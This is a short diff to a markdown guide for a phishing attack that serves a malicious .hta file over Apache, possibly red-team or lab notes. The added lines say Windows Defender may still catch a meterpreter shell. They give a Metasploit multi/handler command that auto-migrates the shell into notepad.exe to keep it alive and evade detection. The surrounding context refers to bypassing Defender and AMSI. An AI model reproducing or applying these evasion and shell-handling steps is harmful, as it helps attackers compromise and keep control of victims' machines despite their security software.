@@ -184,6 +184,11 @@ try{
 <rest of your dotnet2jscript stuff>
 ```
 - This should bypass a noobish Defender and AMSI
+- There is a chance that Defender will still catch your meterpreter shell. As such, it might be a good idea to do the following when running your multi/handler. Note you may need to run it multiple times for it to work
+```bash
+# this will run the migrate module and by default it will attempt to migrate to notepad.exe once a shell is established
+exploit(multi/handler) > set AutoRunScript post/windows/manage/migrate
+```
 ### Sending the email!
 
 Make sure your apache server is running to serve the .hta
